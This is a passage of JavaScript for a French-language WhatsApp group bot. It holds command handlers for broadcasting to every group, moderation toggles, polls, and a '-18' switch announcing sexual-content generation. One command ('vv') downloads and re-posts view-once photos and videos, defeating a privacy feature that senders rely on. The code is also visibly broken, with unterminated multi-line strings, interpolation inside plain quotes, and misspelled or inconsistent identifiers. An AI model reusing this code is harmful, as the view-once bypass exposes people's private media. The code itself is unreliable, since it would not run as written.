            case 'bcgroupe': {
                if (!KevTheCreator) return KevStickOwner()
                if (!text) return replygckev('Texte?\n\nExemple : ${prefix + command} Sophia je t.aime ')
                let getGroups = await Kev.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygckev('Broadcast send dans ${anu.length} Groupe de discussion, et terminey en ${anu.length * 1.5} secondes')
                for (let i of anu) {
                    await sleep(1500)
                    let a = '${ownername}'s Broadcast\n\n' + ''''' + 'Message: ${text}\n\n' + '''''
                    Kev.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: 'Send dans ${i.length}',
                                thumbnailUrl: 'https://telegra.ph/file/5d30d0fd8bfb65d90a3f1.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygckev('Broadcast send dans ${anu.length} avec succes')
            }
            break
            case 'voir_commande':
                if (!KevTheCreator) return KevStickOwner()
                try {
                   const getCase = (cases) => {
                      return "case" + ''${cases}'' + fs.readFileSync("SylversBot.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   replygckev('${getCase(q)}')
                } catch {
                  replygckev('case ${q} introuvable !')
                }
            break
            //groupe
            case 'anti_grosmot':
            case 'antitoxic':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].badword = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].badword = false
                  replygckev('${commad} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'react': {
                if (!KevTheCreator) return KevStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                Kev.sendMessage(m.chat, reactionMessage)
            }
            break
           case '-18': {
if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
if (args[0] === "oui") {
if (AntiNsfw) return replygckev('Activey')
ntnsfw.push(from)
fs.writeFileSync('./recherche/donnees/fonction/-18.json', JSON.stringify(ntnsfw))
replygckev('ce groupe a desormais acces au contenu pornographique')
var groupe = await Kev.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kev.sendMessage(from, {text: '\'\'\'「 ⚠️Attention⚠️ 」\'\'\'\n\nla commande -18 a ete activee dans ce groupe, ce qui signifie que le bot poura generer des videos et images a caractere sexuel!', contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "non") {
if (!AntiNsfw) return replygckev('desactivey')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./recherche/donnees/fonction/-18.json', JSON.stringify(ntnsfw))
replygckev('la commande -18 a ete desactiee donnez votre vie a Dieu le porno n.est pas bien')
} else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
  }
  break
  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygckev(from)
           }
          break
            case 'anti_audio':{
            	if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antiaudio = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antiaudio = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_foreign':{
            	if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[m.chat].antiforeignnum = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[m.chat].antiforeignnum = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!KevheCreator) return KevStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygckev(
                    'Entrez une question a deux options\nExemple: ${prefix}poll qui est le meilleur?|Kev,KenV,...'
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await Kev.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'anti_poll':{
            	if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antipoll = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antipoll = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_sticker':{
            	if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antisticker = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antisticker = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antiimage = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antiimage = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_video':{
            	if (!m.isGroup) return KenvStickGroup()
if (!isBotAdmins) return KenvStickBotAdmin()
if (!isAdmins && !KenvTheCreator) return KenvStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antivideo = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antivideo = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_virtex':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antivirtex = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antivirtex = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_bot':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antibot = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antibot = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'vv': case 'lire_vueunique': {
	if (!m.quoted) return replygckev('Veuillez repondre a un message en vue unique')
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygckev('il ne s.agit pas d.un message en vue unique')
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Kev.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return Kev.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
            case 'anti_vueunique': case 'vv_auto': {
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antiviewonce = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antiviewonce = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_spam':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antispam = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antispam = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KenvFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: '',
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "option_unique",
                "buttonParamsJson": '{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER♨️",
"sections":[{"title":"VEUILLEZ SELECTIONNER  ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER ✅",
"title":"SELECTION ",
"description":"ACTIVER ✅",
"id":"${prefix+command} oui"},
{"header":"DESACTIVER ❌",
"title":"SELECTION ",
"description":"DESACTIVER ❌",
"id":"${prefix+command} non"}
]
}
]
}'
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti_media':{
		         if (!m.isGroup) return KevStickGroup()
if (!isBotAdmins) return KevStickBotAdmin()
if (!isAdmins && !KevTheCreator) return KevStickAdmin()
               
               if (args[0] === 'oui') {
                  db.data.chats[from].antimedia = true
                  replygckev('${command} activey')
               } else if (args[0] === 'non') {
                  db.data.chats[from].antimedia = false
                  replygckev('${command} desactivey')
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande _*${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
